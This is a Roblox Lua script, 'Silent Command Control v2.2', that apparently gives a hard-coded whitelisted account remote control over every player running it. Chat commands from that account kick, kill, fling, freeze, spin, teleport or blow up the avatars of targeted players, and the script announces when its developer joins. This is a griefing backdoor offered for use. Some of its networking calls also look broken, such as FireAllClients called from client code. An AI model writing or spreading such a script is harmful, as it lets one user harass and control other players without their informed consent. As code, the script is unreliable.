--// Silent Command Control v2.2 - by itzC9
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Debris = game:GetService("Debris")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local Character = function() return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() end

-- Whitelist
local WHITELIST = {
    ["C9_1234"] = true
}

-- Shared Remote
local REMOTE_NAME = "SilentCommand_Event_C9"
local Remote = ReplicatedStorage:FindFirstChild(REMOTE_NAME) or Instance.new("RemoteEvent", ReplicatedStorage)
Remote.Name = REMOTE_NAME

local clientList = {}
clientList[LocalPlayer.Name] = true

local function findUser(name)
    name = name:lower()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower():sub(1, #name) == name then
            return plr
        end
    end
end

local function getRandomClient()
    local list = {}
    for _, v in ipairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and clientList[v.Name] then
            table.insert(list, v)
        end
    end
    return #list > 0 and list[math.random(1, #list)] or nil
end

local spinning = false

Remote.OnClientEvent:Connect(function(sender, command, targetName)
    if sender == LocalPlayer then return end
    if not WHITELIST[sender.Name] then return end
    if not clientList[LocalPlayer.Name] then return end

    local char = Character()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    local camera = workspace.CurrentCamera

    command = command:lower()

    if command == "kick" or command == "ban" then
        LocalPlayer:Kick("Removed by admin.")
    elseif command == "fling" and hrp then
        hrp.Velocity = Vector3.new(9999, 9999, 9999)
    elseif command == "kill" and hum then
        hum.Health = 0
    elseif command == "bring" and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
        hrp.CFrame = sender.Character.HumanoidRootPart.CFrame
    elseif command == "goto" and targetName then
        local tgt = findUser(targetName)
        if tgt and tgt.Character and tgt.Character:FindFirstChild("HumanoidRootPart") then
            hrp.CFrame = tgt.Character.HumanoidRootPart.CFrame
        end
    elseif command == "js" then
        local s = Instance.new("Sound", workspace)
        s.SoundId = "rbxassetid://9118823101"
        s.Volume = 10
        s:Play()
        Debris:AddItem(s, 3)
    elseif command:sub(1, 8) == "teleport" then
        local id = tonumber(command:sub(10))
        if id then TeleportService:Teleport(id) end
    elseif command == "freeze" and hrp then
        hrp.Anchored = true
    elseif command == "spin" and hrp then
        if not spinning then
            spinning = true
            task.spawn(function()
                while spinning and hrp.Parent ~= nil do
                    hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(15), 0)
                    task.wait()
                end
            end)
        end
    elseif command == "explode" and hrp then
        local exp = Instance.new("Explosion")
        exp.Position = hrp.Position
        exp.BlastRadius = 10
        exp.BlastPressure = 10000
        exp.Parent = workspace
    elseif command == "nuke" and hrp then
        local exp = Instance.new("Explosion")
        exp.Position = hrp.Position
        exp.BlastRadius = 30
        exp.BlastPressure = 100000
        exp.ExplosionType = Enum.ExplosionType.Craters
        exp.Parent = workspace

        local s = Instance.new("Sound", workspace)
        s.SoundId = "rbxassetid://138186576"
        s.Volume = 10
        s:Play()
        Debris:AddItem(s, 5)

        for i = 1, 30 do
            camera.CFrame = camera.CFrame * CFrame.new(math.random(-1,1), math.random(-1,1), 0)
            task.wait(0.03)
        end
    end
end)

Players.LocalPlayer.Chatted:Connect(function(msg)
    if not WHITELIST[LocalPlayer.Name] then return end
    if not msg:lower():match("^%?.+") then return end

    local split = msg:split(" ")
    local commandRaw = split[1]
    local targetRaw = split[2]
    if not commandRaw or not targetRaw then return end

    local command = commandRaw:sub(2):lower()
    local targets = {}

    if targetRaw == "." then
        for _, v in ipairs(Players:GetPlayers()) do
            if v ~= LocalPlayer and clientList[v.Name] then
                table.insert(targets, v)
            end
        end
    elseif targetRaw == "r" then
        local rand = getRandomClient()
        if rand then table.insert(targets, rand) end
    elseif targetRaw:sub(1,5) == "user/" then
        local name = targetRaw:sub(6)
        local plr = findUser(name)
        if plr then table.insert(targets, plr) end
    end

    for _, target in ipairs(targets) do
        Remote:FireAllClients(LocalPlayer, command, target.Name)
    end
end)

Players.PlayerAdded:Connect(function(plr)
    if WHITELIST[plr.Name] then
        StarterGui:SetCore("SendNotification", {
            Title = "Developer:",
            Text = "A Developer Of This Script Joins: " .. plr.Name,
            Duration = 5
        })
    end
end)